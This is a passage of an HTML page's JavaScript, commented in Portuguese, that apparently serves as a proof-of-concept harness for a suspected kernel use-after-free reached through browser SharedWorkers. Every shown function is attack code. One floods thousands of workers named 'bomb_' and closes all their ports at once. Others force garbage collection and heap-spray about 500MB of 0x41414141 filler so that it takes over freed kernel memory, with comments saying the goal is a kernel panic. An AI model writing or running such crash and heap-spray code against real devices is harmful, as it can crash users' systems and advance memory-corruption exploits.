            // Se o worker foi liberado no Kernel, queremos que esse Spray ocupe o lugar dele
            performHeapSpray();

            if (cycle % 20 === 0) {
                log(`Ciclo ${cycle}: Memória sprayada. Limpando container...`);
                sprayContainer.length = 0; // Limpa para não estourar a RAM (OOM)
            }
            
            if (cycle > 200) {
                clearInterval(loop);
                log("Teste Spray finalizado.");
            }
        }, 100);
    }

    // --- TESTE 3: SharedWorker + GC Pressure ---
    // Cria workers e depois aloca lixo massivo para forçar o Garbage Collector a rodar.
    // Objetivo: Reproduzir o cenário onde o "Pausado" apareceu antes do crash.
    function runGCPressure() {
        log("[GC] Iniciando pressão de Garbage Collection...");
        
        const workers = [];
        // Cria 1000 workers (menos que os 5000 do crash, mas suficiente para encher a tabela)
        for(let i=0; i<1000; i++) {
            workers.push(new SharedWorker("data:text/javascript,1", "gc_target_" + i));
        }
        
        log("Workers criados. Aguardando estabilização (2s)...");
        
        setTimeout(() => {
            log("LIBERANDO workers e forçando GC...");
            
            // 1. Solta as referências
            workers.length = 0; 
            
            // 2. Aloca objetos gigantes para obrigar o navegador a limpar a memória antiga
            // Isso deve disparar o destrutor dos SharedWorkers no Kernel
            try {
                const pressure = [];
                for(let i=0; i<10000; i++) {
                    pressure.push(new ArrayBuffer(1024 * 100)); // 100KB cada
                }
                log("Pressão de memória aplicada.");
            } catch(e) {
                log("Erro de memória (Isso é bom, GC deve estar rodando): " + e);
            }
        }, 2000);
    }

function runExplosiveCleanup() {
        log("[EXPLOSIVE] Iniciando Flood com Gatilho de Destruição...");
        
        if (!window.SharedWorker) {
            log("SharedWorker não suportado.");
            return;
        }
        
        // Mantém referência para poder matar depois
        let workers = []; 
        let count = 0;
        
        const interval = setInterval(() => {
            // Cria em lotes pequenos para ter controle
            for(let i=0; i<10; i++) {
                try {
                    // Cria o worker
                    const sw = new SharedWorker("data:text/javascript,onconnect=function(e){}", "bomb_" + count);
                    // Inicia a porta (importante para o kernel alocar o IPC)
                    sw.port.start();
                    workers.push(sw);
                    count++;
                } catch(e) {
                    clearInterval(interval);
                    log("Erro antes do gatilho: " + e.message);
                    return;
                }
            }
            
            if (count % 100 === 0) log(`Workers ativos: ${count}`);
            
            // GATILHO: Chegamos na "Zona de Perigo" (4500)
            // Não esperamos chegar em 5000 para não travar o loop, queremos comandar a destruição.
            if (count >= 4500) {
                clearInterval(interval);
                triggerMassDestruction(workers);
            }
        }, 5);
    }

    function triggerMassDestruction(workersList) {
        log("!!! GATILHO ATIVADO: Iniciando Destruição em Massa !!!");
        log("Tentando fechar 4500 portas simultaneamente...");

        // 1. O Golpe: Fecha explicitamente todas as conexões IPC
        // Se houver um bug de UAF, o Kernel pode se perder aqui ao tentar fechar tantos handles.
        try {
            for (let i = 0; i < workersList.length; i++) {
                workersList[i].port.close();
            }
        } catch(e) {
            log("Erro durante o fechamento: " + e.message);
        }

        // 2. Dereferência: Diz ao JS "não preciso mais disso"
        workersList = null; 

        log("Portas fechadas. Forçando Garbage Collection via Alocação...");

        // 3. Pressão de Memória: Obriga o Kernel a reutilizar o espaço que acabamos de liberar
        // Se o espaço ainda estiver sendo usado (Race Condition), isso causa o Panic.
        setTimeout(() => {
            try {
                const pressure = [];
                // Aloca 500MB de "Lixo" (0x41)
                const chunk = new Uint32Array(1024 * 256).fill(0x41414141);
                for(let i=0; i<500; i++) {
                    pressure.push(chunk.slice(0));
                }
                log("Memória alocada. Se você ler isso, o Kernel resistiu.");
            } catch(e) {
                log("OOM durante pressão (Esperado).");
            }
        }, 100);
    }

    </script>
</body>
</html>





